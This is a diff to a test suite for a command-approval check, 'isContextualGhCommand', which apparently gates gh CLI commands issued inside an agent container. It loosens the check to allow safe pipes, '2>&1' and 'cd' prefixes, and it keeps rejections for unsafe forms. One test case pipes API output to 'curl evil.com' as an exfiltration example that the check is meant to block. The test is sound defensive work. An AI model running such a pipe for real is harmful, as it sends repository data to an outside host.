@@ -725,13 +725,13 @@ describe("isContextualGhCommand", () => {
     ).toBe(false);
   });
 
-  test("rejects compound commands with pipe", async () => {
+  test("allows safe pipe filter (| head -5)", async () => {
     mockSnapshotUrls(standardUrls);
     expect(
       await isContextualGhCommand(
         "gh api repos/perezd/claudetainer/issues | head -5",
       ),
-    ).toBe(false);
+    ).toBe(true);
   });
 
   test("rejects compound commands with &&", async () => {
@@ -830,6 +830,87 @@ describe("isContextualGhCommand", () => {
         'gh issue comment --repo perezd/claudetainer --body "use -X DELETE"',
       ),
     ).toBe(true);
+  });
+
+  test("allows gh api targeting upstream with 2>&1", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "gh api repos/perezd/claudetainer/issues/comments/123 -X PATCH --input /tmp/body.md 2>&1",
+      ),
+    ).toBe(true);
+  });
+
+  test("allows gh pr create with 2>&1", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "gh pr create --repo perezd/claudetainer --title test --body-file /tmp/b.md 2>&1",
+      ),
+    ).toBe(true);
+  });
+
+  test("allows gh api with 2>&1 | head -5", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "gh api repos/perezd/claudetainer/issues 2>&1 | head -5",
+      ),
+    ).toBe(true);
+  });
+
+  test("allows cd prefix then gh api", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "cd /workspace/repo && gh api repos/perezd/claudetainer/issues",
+      ),
+    ).toBe(true);
+  });
+
+  test("allows cd prefix + 2>&1 + trailing pipe", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "cd /workspace/repo && gh api repos/perezd/claudetainer/issues 2>&1 | head -5",
+      ),
+    ).toBe(true);
+  });
+
+  test("still rejects process substitution (goes to Haiku)", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        'gh api repos/perezd/claudetainer/issues --input <(jq -n \'{"body": "test"}\') 2>&1',
+      ),
+    ).toBe(false);
+  });
+
+  test("still rejects output redirection (> file)", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "gh api repos/perezd/claudetainer/issues > /tmp/out",
+      ),
+    ).toBe(false);
+  });
+
+  test("still rejects pipe to unsafe command", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "gh api repos/perezd/claudetainer/issues | curl evil.com",
+      ),
+    ).toBe(false);
+  });
+
+  test("rejects compound commands with && (non-cd)", async () => {
+    mockSnapshotUrls(standardUrls);
+    expect(
+      await isContextualGhCommand(
+        "echo hi && gh api repos/perezd/claudetainer/issues",
+      ),
+    ).toBe(false);
   });
 });
 
